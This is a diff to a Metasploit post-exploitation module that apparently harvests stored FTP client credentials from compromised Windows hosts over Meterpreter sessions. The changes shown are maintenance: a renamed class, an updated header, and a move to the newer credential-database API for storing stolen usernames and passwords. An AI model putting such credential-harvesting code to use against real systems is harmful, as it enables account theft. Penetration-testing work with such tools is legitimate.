@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-require 'rex'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::UserProfiles
 
   def initialize(info={})
@@ -19,7 +16,7 @@ class Metasploit3 < Msf::Post
         FTP client for Windows.
       },
       'License'       => MSF_LICENSE,
-      'Author'        => [ 'Brendan Coles <bcoles[at]gmail.com>' ],
+      'Author'        => [ 'bcoles' ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ]
     ))
@@ -72,20 +69,32 @@ class Metasploit3 < Msf::Post
       print_good("#{session.sock.peerhost}:#{port} (#{host}) - '#{user}:#{pass}'")
 
       # save results to the db
-      if session.db_record
-        source_id = session.db_record.id
-      else
-        source_id = nil
-      end
-      report_auth_info(
-        :host        => host,
-        :port        => port,
-        :source_id   => source_id,
-        :source_type => "exploit",
-        :user        => user,
-        :pass        => pass
-      )
+      service_data = {
+        address: Rex::Socket.getaddress(host),
+        port: port,
+        protocol: "tcp",
+        service_name: "ftp",
+        workspace_id: myworkspace_id
+      }
+
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: self.refname,
+        username: user,
+        private_data: pass,
+        private_type: :password
+      }
+
+      credential_core = create_credential(credential_data.merge(service_data))
+
+      login_data = {
+        core: credential_core,
+        access_level: "User",
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }
+
+      create_credential_login(login_data.merge(service_data))
     end
   end
-
 end
